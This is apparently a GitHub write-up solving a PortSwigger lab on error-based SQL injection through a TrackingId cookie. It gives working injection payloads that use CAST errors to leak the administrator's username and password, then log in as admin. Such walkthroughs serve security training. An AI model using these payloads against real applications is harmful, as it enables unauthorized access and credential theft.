## Lab Description
![image](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/63ea4352-fbc8-443b-a55f-98dd56740f29)

### Solution

  - When clicking on any catgory in products filter, browser sends a GET request with a tracking cookie & a session cookie.
  - Let's try to input a special character `'` in the TrackingID parameter since it is vulnerable as per lab description to try and induce an SQL error.
 
`Cookie: TrackingId=e00R0OKbtGq3H944';`

![1](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/dad37520-ff1c-4a6b-b291-c4d7e80993bc)

  -  add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:

`TrackingId=ogAZZfxtOKUELbuJ'--`

![2](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/a3e4f470-6107-4798-9f4e-68faee77843a)

  - Since we know what query is being made, now we can craft our payload using CAST conditional expresiions.
  - Now we give a generic SELECT query & CAST the returned value to int datatype.

![3](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/9696619d-11f8-4212-a972-3f9225799191)

  - It says that AND condition must be a boolean expression.
  - Modify the condition accordingly. For example, you can simply add a comparison operator (=) as follows:

`TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`

![4](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/c182248e-b7c2-4aea-b9a1-afe2d461aa8e)

  - The condition got TRUE and it returned all the category items with a 200 OK status code.
  - Now modify the SELECT query to retreive username from the database.

`' AND 1=CAST((SELECT username FROM users) AS int)--`

![5](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/a9ca7835-b3b0-45d0-9589-8c477c6b6be1)

  - The query is being truncated here. So lets either remove some or all of trackingID cookie value to free up some space.
  - Modify the query to return only one row:

`TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`

![8](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/0fe0c72a-77f2-49fb-a1fb-e881ed3994b7)

  - Now that we know that *administrator* is the first user in the users table , let's retreive his password.
  -  modify the query once again to leak their password:

`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

![9](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/9bd917e4-fbeb-4fbc-91bf-47d58179eeea)

  - Now login as admin in the shopping website to solve the lab.
  
![10](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/8489e408-4c49-476c-ac70-a5a6b0205715)


